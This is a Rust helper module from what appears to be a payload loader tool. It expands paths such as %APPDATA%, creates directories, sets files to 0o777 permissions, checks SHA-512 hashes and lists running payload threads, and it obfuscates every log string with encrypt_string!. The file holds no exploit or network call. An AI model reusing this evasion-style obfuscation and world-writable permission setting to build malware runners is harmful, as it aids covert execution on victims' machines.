use crate::payload::Payload;

use anyhow::Result;
use chksum_sha2_512 as sha2_512;
use shellexpand;
use std::fs;
use std::fs::create_dir_all;
use std::fs::File;
use std::io::prelude::*;
#[cfg(target_os = "linux")]
use std::os::unix::fs::PermissionsExt;
use std::path::Path;
use std::path::PathBuf;
use std::thread;

use cryptify::encrypt_string;
use log::error;
use log::info;

pub fn calculate_path(path_with_env: &String) -> Result<PathBuf, anyhow::Error> {
    let expanded = shellexpand::env(path_with_env)?; // Expands %APPDATA% or any other environment variable
    let path: &Path = Path::new(&*expanded); // Convert to a Path
    Ok(path.to_owned())
}

pub fn create_diretory(path: &PathBuf) -> Result<(), anyhow::Error> {
    match path.parent() {
        Some(parent_dir) => {
            if fs::metadata(parent_dir).is_ok() == false {
                info!(
                    "{}{:?}",
                    encrypt_string!("[+] path not exist, create: "),
                    parent_dir
                );
                create_dir_all(parent_dir)?;
            }
        }
        None => error!(
            "{}{:?}",
            encrypt_string!("error, impossible to retreive parent path: "),
            path
        ),
    };
    Ok(())
}

#[cfg(target_os = "linux")]
pub fn set_permission(data_write_path: &PathBuf) {
    if cfg!(target_os = "linux") {
        info!("{}{:?}", encrypt_string!("setpermision: "), data_write_path);
        std::fs::set_permissions(data_write_path, std::fs::Permissions::from_mode(0o777)).unwrap();
    };
}

//#[cfg(target_os = "windows")]
//pub fn set_permission(_data_write_path: &String) {}

pub fn same_hash_sha512(hash: &String, path: &PathBuf) -> bool {
    if *hash == "".to_string() {
        return false;
    }

    let mut f = match File::open(path) {
        Ok(f) => f,
        Err(_) => return false,
    };
    let mut buffer: Vec<u8> = Vec::new();

    // read the whole file
    match f.read_to_end(&mut buffer) {
        Ok(_) => (),
        Err(_) => return false,
    };
    let digest = sha2_512::chksum(buffer).unwrap();

    digest.to_hex_lowercase() == *hash
}

pub fn print_running_thread(running_thread: &mut Vec<(thread::JoinHandle<()>, Payload)>) {
    if running_thread.len() != 0 {
        info!(
            "{}{}",
            encrypt_string!("[+] RUNNING thread "),
            running_thread.len()
        );
        for i in running_thread {
            info!("{}{:?}", encrypt_string!("-thread: "), i.1);
        }
    } else {
        info!("{}", encrypt_string!("[+] no RUNNING thread"));
    };
}

pub fn fail_linux_message(message: String) {
    error!(
        "{}{}",
        encrypt_string!("Its linux, impossible to run the payload: "),
        message
    );
}
